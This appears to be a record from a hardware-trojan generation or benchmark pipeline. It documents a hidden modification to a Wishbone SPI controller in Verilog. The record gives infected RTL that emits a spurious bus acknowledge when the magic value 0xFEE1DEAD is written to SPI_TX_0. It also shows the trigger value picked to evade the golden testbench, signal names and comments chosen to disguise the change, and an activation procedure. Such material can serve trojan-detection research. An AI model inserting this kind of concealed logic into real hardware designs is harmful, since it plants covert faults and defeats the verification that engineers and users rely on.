new_signals.name: tx_cal
new_signals.comment_in_source: settle-pipe qualifier, reused for ack-pipe bookkeeping

new_signals.name: ack_pipe
new_signals.comment_in_source: settle-pipe flag, reused for post-commit bookkeeping

trigger_condition.check_expression: tx_cal = spi_tx_sel[0] & wb_we_i & (wb_dat_i == 32'hFEE1DEAD), latched into ack_pipe at the real-ack cycle

inputs_used.name: spi_tx_sel[0]
inputs_used.description: existing address-decode wire (wb_cyc_i & wb_stb_i & (wb_adr_i[`SPI_OFS_BITS] == `SPI_TX_0)) that selects the SPI_TX_0 register

trigger_condition.magic_value_derivation: confirmed clear by replaying the golden testbench's exact deterministic PRNG recurrence offline in Python (prng_state = prng_state * 1103515245 + 12345, seeded 32'hDEC0DED1, matching tb_spi_top.v's own LCG) across all 30 pseudo-random TX0 values it writes during its MSB-mode sweep (10 char-lengths x 3 vectors), plus all 10 fixed TX0 constants it writes elsewhere in the fixed-vector sub-tests (0x5a, 0xa5, 0x5aa5, 0x76543210, 0xccddeeff, 0xaa55a5a5, 0x01248421, 0x1, 0x3C3C3C3C, 0xBEEF) -- 0xFEE1DEAD collides with none of them. Empirically confirmed via a full Eval1 run: SIMULATION PASSED, meaning the SPI_TX_0 register is never written with 0xFEE1DEAD anywhere in the golden run, so ack_pipe is never armed

payload.clean_behavior: always @(posedge wb_clk_i or posedge wb_rst_i) begin if (wb_rst_i) wb_ack_o <= #Tp 1'b0; else wb_ack_o <= #Tp wb_cyc_i & wb_stb_i & ~wb_ack_o; end
payload.infected_behavior: always @(posedge wb_clk_i or posedge wb_rst_i) begin if (wb_rst_i) begin wb_ack_o <= #Tp 1'b0; ack_pipe <= #Tp 1'b0; end else begin wb_ack_o <= #Tp (wb_cyc_i & wb_stb_i & ~wb_ack_o) | ack_pipe; ack_pipe <= #Tp (wb_cyc_i & wb_stb_i & ~wb_ack_o) & tx_cal; end end
payload.description: the controller's existing single-cycle ack pulse (generated by the self-clearing term wb_cyc_i & wb_stb_i & ~wb_ack_o) is left completely intact for every ordinary access. The infected design adds a one-shot latch, ack_pipe, armed at the exact cycle the real ack for a matching TX0 write fires. One clock cycle later -- by which point a well-behaved master has typically already dropped wb_cyc_i/wb_stb_i, since it only needs to hold them through the real ack -- the controller asserts wb_ack_o a SECOND time, entirely unconditioned on wb_cyc_i or wb_stb_i. This is a direct Wishbone B4 protocol violation: a slave must never assert ack_o except in response to an active, addressed cyc_i/stb_i-qualified transaction. ack_pipe is naturally self-clearing: its own next-cycle value is gated by the same cyc_i&stb_i-qualified address-decode term (spi_tx_sel[0], which embeds wb_cyc_i & wb_stb_i), which is 0 once the master has dropped the bus -- so each occurrence of the magic write produces exactly one extra spurious ack, never a persistent fault. No data register, SPI shift logic, or clock generator is touched anywhere; the trojan only ever affects wb_ack_o's pulse timing.

activation_requirements.top_level_interface: real Wishbone top-level ports of spi_top (a write to the SPI_TX_0 register with a specific data value, observed over the cycle immediately following its ack with wb_cyc_i/wb_stb_i already deasserted); no internal/hierarchical probing of the DUT
procedure: issue a write to the SPI_TX_0 register (wb_adr_i[`SPI_OFS_BITS]==0, wb_we_i=1) whose write-data word (wb_dat_i) is exactly 32'hFEE1DEAD, and wait for the real wb_ack_o pulse as usual
drop wb_cyc_i and wb_stb_i immediately after the real ack, as any well-behaved master would
observe wb_ack_o on the very next clock cycle: the infected design asserts it a second time despite wb_cyc_i already being low, while the clean design stays low

one_shot_or_persistent: one-shot per triggering write: ack_pipe is armed exactly once (at the real ack of the matching write) and self-clears the cycle it fires the phantom pulse (since its own re-arm condition requires wb_cyc_i/wb_stb_i still asserted, which they no longer are), so each occurrence of the magic TX0 write produces exactly one extra spurious ack, never a persistent or repeating fault; confirmed in checkpoint 3, where an ordinary write issued immediately after the trigger acks normally with no further spurious pulses

eval0_synthesis.notes: 0 ERROR lines, full technology mapping of spi_top.v, spi_clgen.v and spi_shift.v, top-module chip area 16191.7792 um^2

eval1_dormancy.notes: all checks passed: register sanity, 9 fixed feature vectors, 30 MSB-mode sweep transfers across 10 lengths/3 vectors/4 polarity combos, busy-rejection -- confirms the magic value 0xFEE1DEAD is never written to SPI_TX_0 anywhere in the golden run, so ack_pipe is never armed and every access's ack behavior is bit-for-bit, cycle-for-cycle identical to the clean design

eval2_activation.tool: Icarus Verilog 12.0, standalone dual-DUT activation testbench driving both DUTs from one shared, lockstepped stimulus bus (mirroring the design's own golden wb_master_model.v write-task timing exactly -- '#1;' delays before every signal transition and a plain 'while (~ack) @(posedge clk);' poll, with no same-edge sampling) through real top-level Wishbone ports
eval2_activation.notes: 3 checkpoints: (1) near-miss -- ordinary TX0 write (data != magic value): both DUTs show 0 ack pulses in the 8 cycles after wb_cyc_i/wb_stb_i drop; (2) TRIGGER -- TX0 write with the exact magic value 0xFEE1DEAD: clean DUT shows 0 ack pulses after cyc/stb drop, infected DUT shows exactly 1 (the phantom ack, asserted while wb_cyc_i is already low) -- the documented protocol violation; (3) one-shot/recovery -- an ordinary write issued immediately after the trigger acks normally with 0 further spurious pulses on either DUT, confirming the violation does not persist. 0 unexpected mismatches, 1 documented trigger confirmation

stealth_rationale: the two new elements, tx_cal ("settle-pipe qualifier, reused for ack-pipe bookkeeping") and ack_pipe ("settle-pipe flag, reused for post-commit bookkeeping"), are named and commented like ordinary pipeline/settle-timing bookkeeping, a plausible artifact of a bus-turnaround or settle-delay design pattern; no comment anywhere mentions a trigger, protocol violation, spurious ack, or anything trojan-related. The diff against the clean file is a 4-line declaration/comment block (after the existing SPI_TX_0 address-decode logic), a one-line register declaration, and a restructuring of the existing ack-generation always block that keeps its original self-clearing term intact on both branches of the new OR -- port list, parameters, register map, SPI shift logic, and the clock generator module are all untouched. No data path or SPI protocol logic is touched anywhere; the trojan only ever affects the Wishbone ack-pulse timing.
